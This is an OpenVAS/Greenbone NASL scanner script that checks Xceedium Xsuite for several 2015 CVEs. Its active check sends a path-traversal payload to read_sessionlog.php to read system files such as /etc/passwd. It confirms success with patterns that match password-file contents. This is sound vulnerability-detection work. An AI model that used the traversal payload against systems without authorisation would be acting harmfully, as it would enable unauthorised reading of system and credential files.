# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:xceedium:xsuite";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807086");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2015-4665", "CVE-2015-4666", "CVE-2015-4667", "CVE-2015-4668",
                "CVE-2015-4669", "CVE-2015-4664");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-10-09 19:57:00 +0000 (Tue, 09 Oct 2018)");
  script_tag(name:"creation_date", value:"2016-03-03 18:23:47 +0530 (Thu, 03 Mar 2016)");
  script_name("Xceedium Xsuite Multiple Vulnerabilities");

  script_tag(name:"summary", value:"Xceedium Xsuite is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - An insufficient validation of input via 'id' POST  parameter.

  - An insufficient validation of input via 'fileName' parameter in
    'ajax_cmd.php' script.

  - An insufficient input validation via 'logFile' parameter in
    read_sessionlog.php script.

  - An insufficient input validation via 'spadmind' process.

  - An improper password management.

  - An insufficient input validation via 'redirurl' parameter in
    openwin.php script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject arbitrary commands, read arbitrary files, to bypass
  security restrictions, to inject arbitrary web script or HTML and
  allows local  users to escalate their privileges.");

  script_tag(name:"affected", value:"Xceedium Xsuite 2.3.0 and 2.4.3.0");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37708");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/76501");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/76500");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/132809");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_xceedium_xsuite_remote_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("Xceedium/Xsuite/Installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if(!http_port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:http_port))
  exit(0);

files = traversal_files();

foreach file (keys(files))
{
  url = dir + '/opm/read_sessionlog.php?logFile=....//....//....//....//' + files[file];

  req = http_get(item:url,  port:http_port);
  res = http_keepalive_send_recv(port:http_port, data:req);

  if(res =~ "^HTTP/1\.[01] 200" &&
     (res =~ 'root:.*:0:[01]:' || '; for 16-bit app support' >< res ||
     '[boot loader]' >< res))
  {
    report = http_report_vuln_url(port:http_port, url:url);
    security_message(port:http_port, data:report);
    exit(0);
  }
}
